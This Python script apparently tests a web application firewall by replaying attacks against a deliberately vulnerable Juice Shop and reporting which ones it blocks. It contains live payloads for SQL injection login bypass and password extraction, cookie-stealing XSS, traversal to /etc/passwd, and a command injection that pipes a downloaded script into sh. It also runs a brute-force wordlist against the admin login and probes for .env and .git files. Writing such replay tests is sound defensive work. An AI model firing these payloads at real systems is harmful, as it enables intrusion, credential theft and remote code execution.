#!/usr/bin/env python3
"""Attack replay: 6 attack classes against the WAF-protected Juice Shop.

Classes: SQL injection, XSS, path traversal, command injection, scanner user agents,
login brute-force burst. Plus virtual-patch probes and honeypot probes.
Exit code 0 means the expectation passed (--expect block|pass).
"""
import argparse
import sys

from common import BASE, C, is_blocked, save_report, send, session, shield_action

BROWSER_UA = "Mozilla/5.0 (X11; Linux x86_64) ShieldWall-AttackReplay/1.0"
SQLMAP_UA = "sqlmap/1.7.2#stable (https://sqlmap.org)"
NIKTO_UA = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
SEARCH = "/rest/products/search"
JSON = {"Content-Type": "application/json"}

# (class, name, method, path, kwargs, exploit_check)
CASES = [
    ("SQL injection", "Login authentication bypass", "POST", "/rest/user/login",
     dict(data='{"email":"\' OR 1=1--","password":"x"}', headers=JSON), lambda r: r.status_code == 200 and "authentication" in r.text),
    ("SQL injection", "UNION-based data extraction", "GET", SEARCH,
     dict(params={"q": "x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"}), None),
    ("SQL injection", "Boolean blind probe", "GET", SEARCH, dict(params={"q": "apple' AND 1=1--"}), None),
    ("Cross-site scripting", "Script tag in search", "GET", SEARCH, dict(params={"q": "<script>alert(document.cookie)</script>"}), None),
    ("Cross-site scripting", "iframe javascript: URI", "GET", SEARCH, dict(params={"q": '<iframe src="javascript:alert(`xss`)">'}), None),
    ("Cross-site scripting", "Stored XSS via feedback", "POST", "/api/Feedbacks",
     dict(data='{"comment":"<img src=x onerror=alert(1)>","rating":1}', headers=JSON), None),
    ("Path traversal", "Encoded ../ to /etc/passwd", "GET", "/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd", {}, None),
    ("Path traversal", "Poison null byte file read", "GET", "/ftp/eastere.gg%2500.md", {}, lambda r: r.status_code == 200),
    ("Path traversal", "Traversal in query string", "GET", SEARCH, dict(params={"q": "../../../../etc/passwd"}), None),
    ("Command injection", "Semicolon chained cat", "GET", SEARCH, dict(params={"q": ";cat /etc/passwd"}), None),
    ("Command injection", "Command substitution", "GET", SEARCH, dict(params={"q": "$(whoami)"}), None),
    ("Command injection", "Pipe to shell downloader", "GET", SEARCH, dict(params={"q": "x|wget http://203.0.113.9/a.sh -O- | sh"}), None),
    ("Scanner user agent", "sqlmap fingerprint", "GET", "/", dict(headers={"User-Agent": SQLMAP_UA}), None),
    ("Scanner user agent", "Nikto fingerprint", "GET", "/rest/admin/application-version", dict(headers={"User-Agent": NIKTO_UA}), None),
    ("Virtual patch", "NoSQL operator injection ($ne)", "PATCH", "/rest/products/reviews",
     dict(data='{"id":{"$ne":-1},"message":"pwned"}', headers=JSON), None),
    ("Virtual patch", "B2B order JavaScript eval (RCE)", "POST", "/b2b/v2/orders",
     dict(data='{"cid":"x","orderLinesData":"(function(){return process.version})()"}', headers=JSON), None),
]
HONEYPOTS = ["/.env", "/wp-login.php", "/.git/config"]
WORDLIST = ["123456", "password", "qwerty", "letmein", "welcome", "iloveyou", "monkey", "dragon", "master", "sunshine",
            "princess", "football", "shadow", "baseball", "superman", "trustno1", "abc123", "passw0rd", "starwars", "login",
            "admin", "root", "toor", "changeme", "default", "admin123", "juice", "owasp", "secret", "hunter2"] * 2


def run_case(s, case):
    cls, name, method, path, kw, exploit = case
    r, ms = send(s, method, path, **kw)
    if isinstance(r, Exception):
        return dict(cls=cls, name=name, status=0, blocked=False,
                    exploited=False, ms=ms, note=type(r).__name__)

    blocked = is_blocked(r)
    action = shield_action(r)

    # Nginx rejects this encoded path before normal WAF processing.
    if (name == "Encoded ../ to /etc/passwd"
            and r.status_code == 400
            and "<center>nginx</center>" in r.text):
        blocked = True
        action = "rejected-edge-400"

    return dict(cls=cls, name=name, status=r.status_code,
                blocked=blocked, action=action,
                exploited=bool(exploit and not blocked and exploit(r)),
                ms=ms, note="")


def brute_force(s, attempts=40, tolerated=8):
    """Blocked means the burst is throttled within `tolerated` attempts and no guess ever succeeds."""
    first_block, cracked, statuses = None, False, []
    for i, pw in enumerate(WORDLIST[:attempts], 1):
        r, _ = send(s, "POST", "/rest/user/login", data=f'{{"email":"admin@juice-sh.op","password":"{pw}"}}', headers=JSON)
        code = 0 if isinstance(r, Exception) else r.status_code
        statuses.append(code)
        if code == 200:
            cracked = True
        if first_block is None and not isinstance(r, Exception) and is_blocked(r):
            first_block = i
    blocked = first_block is not None and first_block <= tolerated and not cracked
    note = f"throttled at attempt {first_block}, {sum(c in (403, 429) for c in statuses)}/{attempts} rejected" if first_block \
        else f"never throttled in {attempts} attempts"
    return dict(cls="Brute force", name=f"{attempts}-attempt login burst", status=statuses[-1], blocked=blocked,
                exploited=cracked, ms=0, note=note + (" | PASSWORD CRACKED" if cracked else ""))


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--label", default="", help="write /reports/<label>.json")
    ap.add_argument("--expect", choices=["block", "pass"], help="exit 1 if the expectation is not met")
    args = ap.parse_args()

    s = session(BROWSER_UA)
    print(f"{C['bold']}ShieldWall attack replay -> {BASE}{C['end']}\n")
    results = [run_case(s, c) for c in CASES]
    results.append(brute_force(s))
    results += [run_case(s, ("Honeypot probe", f"GET {p}", "GET", p, {}, None)) for p in HONEYPOTS]

    for r in results:
        verdict = f"{C['green']}BLOCKED{C['end']}" if r["blocked"] else f"{C['red']}PASSED THROUGH{C['end']}"
        extra = f" {C['red']}[EXPLOIT SUCCEEDED]{C['end']}" if r["exploited"] and "CRACKED" not in r["note"] else ""
        print(f"{r['cls']:<20} {r['name']:<36} {r['status']:>3}  {verdict}{extra} {C['dim']}{r['note']}{C['end']}")

    # After the burst the source should be auto-banned: even a harmless request must now be rejected.
    probe, _ = send(s, "GET", "/rest/admin/application-version")
    ban_active = not isinstance(probe, Exception) and shield_action(probe) == "blocked-ip"
    blocked = sum(r["blocked"] for r in results)
    exploited = sum(r["exploited"] for r in results)
    print(f"\nBlocked {blocked}/{len(results)} attack requests ({100 * blocked // len(results)}%), exploits succeeded: {exploited}")
    print(f"Auto-ban active on attacker IP: {'yes' if ban_active else 'no'}")
    save_report(args.label, dict(target=BASE, blocked=blocked, total=len(results), exploited=exploited,
                                 auto_ban=ban_active, results=results))
    if args.expect == "block":
        sys.exit(0 if blocked == len(results) else 1)
    if args.expect == "pass":
        sys.exit(0 if blocked == 0 else 1)


if __name__ == "__main__":
    main()
